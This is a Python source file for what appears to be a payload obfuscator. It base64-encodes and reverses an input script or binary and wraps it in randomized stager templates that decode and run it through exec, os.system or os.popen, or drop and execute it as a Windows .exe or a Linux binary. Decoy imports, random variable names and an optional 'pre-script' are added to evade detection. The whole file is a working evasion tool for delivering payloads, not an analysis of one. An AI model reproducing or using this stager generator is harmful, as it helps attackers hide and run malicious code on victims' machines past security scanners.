#!/usr/bin/env python3
import argparse
import blessed
import base64
import os
import sys
import random
import string

t = blessed.Terminal()

logo = """
██████      █████     █ ██████             ██████
█     █  ██          █        █                 ██
       █               █          █            ██
█      █  ██      █          █                ██
█      █   ██         █          █         ███            
█      █  █          █          █          █████████ 
█     █    ██        █        █
██ ███      █████     █ ██ ███ 
"""

class message:
    def error(msg):
        print(f"{t.red}❌{msg}❌{t.normal}")
    def success(msg):
        print(f"{t.green}⚡{msg}⚡{t.normal}")

class templates:
    class python:
        class universal:
            templates = ["""
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
RANDOM_VAR0_NAME_HERE = base64.b64decode("ENCODED_PAYLOAD_HERE"[::-1]) RANDOM_NEWLINES
exec(RANDOM_VAR0_NAME_HERE) RANDOM_NEWLINES
            """, """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
exec(base64.b64decode("ENCODED_PAYLOAD_HERE"[::-1])) RANDOM_NEWLINES
            """] 
    class binary:
        class windows:
            templates = ["""
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
print(os.popen("RANDOM_VAR0_NAME_HERE.exe").read()) RANDOM_NEWLINES
            """,
            """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
RANDOM_VAR2_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]) RANDOM_NEWLINES
open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(RANDOM_VAR2_NAME_HERE) RANDOM_NEWLINES
os.popen("RANDOM_VAR0_NAME_HERE.exe") RANDOM_NEWLINES
            """,
            """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
RANDOM_VAR2_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]) RANDOM_NEWLINES
open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(RANDOM_VAR2_NAME_HERE) RANDOM_NEWLINES
os.system("RANDOM_VAR0_NAME_HERE.exe") RANDOM_NEWLINES
            """,
            """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
os.system("RANDOM_VAR0_NAME_HERE.exe") RANDOM_NEWLINES
            """]
        class linux:
            templates = ["""
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
open("RANDOM_VAR0_NAME_HERE", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
print(os.popen("chmod +x RANDOM_VAR0_NAME_HERE && ./RANDOM_VAR0_NAME_HERE").read()) RANDOM_NEWLINES
            """,
            """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
RANDOM_VAR2_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]) RANDOM_NEWLINES
open("RANDOM_VAR0_NAME_HERE", "wb").write(RANDOM_VAR2_NAME_HERE) RANDOM_NEWLINES
os.popen("chmod +x RANDOM_VAR0_NAME_HERE && ./RANDOM_VAR0_NAME_HERE") RANDOM_NEWLINES
            """,
            """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
RANDOM_VAR2_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]) RANDOM_NEWLINES
open("RANDOM_VAR0_NAME_HERE", "wb").write(RANDOM_VAR2_NAME_HERE) RANDOM_NEWLINES
os.system("chmod +x RANDOM_VAR0_NAME_HERE && ./RANDOM_VAR0_NAME_HERE") RANDOM_NEWLINES
            """,
            """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
open("RANDOM_VAR0_NAME_HERE", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
os.system("chmod +x RANDOM_VAR0_NAME_HERE && ./RANDOM_VAR0_NAME_HERE") RANDOM_NEWLINES
            """]
    class bash:
        templates = ["""
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
RANDOM_VAR0_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]).decode() RANDOM_NEWLINES
RANDOM_VAR1_NAME_HERE = os.popen(RANDOM_VAR0_NAME_HERE).read() RANDOM_NEWLINES
print(RANDOM_VAR1_NAME_HERE) RANDOM_NEWLINES
        """,
        """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
RANDOM_VAR0_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]).decode() RANDOM_NEWLINES
os.system(RANDOM_VAR0_NAME_HERE) RANDOM_NEWLINES
        """,
        """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
os.system(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]).decode()) RANDOM_NEWLINES
        """,
        """
import os RANDOM_NEWLINES
RANDOM_IMPORTS RANDOM_NEWLINES
import base64 RANDOM_NEWLINES
PRE_SCRIPT_HERE RANDOM_NEWLINES
RANDOM_VAR1_NAME_HERE = os.popen(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]).decode()).read() RANDOM_NEWLINES
print(RANDOM_VAR1_NAME_HERE) RANDOM_NEWLINES
        """,]


def arg_check(args):
    if args.os not in ['windows', 'linux']:
        message.error('Invalid OS')
        sys.exit(1)
    if os.path.exists(args.output_file):
        message.error('Output file already exists')
        sys.exit(1)
    if args.format not in ['python', 'binary', 'bash']:
        message.error('Invalid file format')
        sys.exit(1)
    if not os.path.isfile(args.input_file):
        message.error('Input file does not exist')
        sys.exit(1)
    if args.pre_script != "" and not os.path.isfile(args.pre_script):
        message.error("Pre script file doesn't exist")
        sys.exit(1)
    message.success("Arguments passed the checks")

class obfuscate:
    def payload_encode():
        payload = open(args.input_file, 'rb').read()
        encoded_payload = base64.b64encode(payload).decode()[::-1]
        message.success("Payload encoded")
        return encoded_payload

    def random_var():
        variable_name = ""
        variable_name += random.choice(list("abcdefghijklmnopqrstuvwxyz"))
        charset = list("abcdefghijklmnopqrstuvwxyz1234567890")
        length = random.randint(4,15)
        for cur in range(length):
            character = random.choice(charset)
            if character not in list("1234567890"):
                case = [character, character.upper()]
                character = random.choice(case)
            variable_name += character
        return variable_name

    def random_imports():
        imports = ""
        list_of_imports = """
import string
import socket
import subprocess
import math
import random""".split("\n")
        for i in range(random.randint(0,5)):
            imports += random.choice(list_of_imports) + '\n'
        message.success("Random imports added")
        return imports 


    def template_configure(template):
            for i in range(99999):
                if f"RANDOM_VAR{i}_NAME_HERE" in template:
                    template = template.replace(f"RANDOM_VAR{i}_NAME_HERE", obfuscate.random_var())
                else:
                    break
            template = template.replace("RANDOM_NEWLINES", '\n' * random.randint(0,3))
            template = template.replace("ENCODED_PAYLOAD_HERE", obfuscate.payload_encode())
            template = template.replace("RANDOM_IMPORTS", obfuscate.random_imports())
            if args.pre_script != "":
                template = template.replace("PRE_SCRIPT_HERE", open(args.pre_script).read().strip())
            message.success("Template configured")
            return template


def main(args):
    if args.format == "python":
        message.success("Using python templates")
        template = random.choice(templates.python.universal.templates)
        template = obfuscate.template_configure(template)
    if args.format == "binary":
        message.success("Using binary templates")
        if args.os == "windows":
            template = random.choice(templates.binary.windows.templates)
            template = obfuscate.template_configure(template)
        elif args.os == "linux":
            template = random.choice(templates.binary.linux.templates)
            template = obfuscate.template_configure(template)
    if args.format == "bash":
        if args.os == "windows":
            messge.error("Bash format is only for linux systems")
            sys.exit(1)
        template = random.choice(templates.bash.templates)
        template = obfuscate.template_configure(template)
    open(args.output_file, "w").write(template)
    print(f"{t.blue}🏁----CODE-OBFUSCATED-SUCCESSFULLY----🏁")

if __name__ == "__main__":
    print(f"{t.green}{logo}{t.normal}")
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--input-file', help="File you want to obfuscate.", required=True)
    parser.add_argument('-f', '--format', help="What format the file is you want to obfuscate. (python, binary, bash)", required=True)
    parser.add_argument('-o', '--output-file', help="File where you want the obfuscated while to be written.", required=True)
    parser.add_argument('-p', '--pre-script', help="Python program to run before executing the main payload.", default="")
    parser.add_argument('--os', help="Operating system the obfuscated code will be ran in. (windows,linux)", required=True)
    args = parser.parse_args()
    arg_check(args)
    main(args)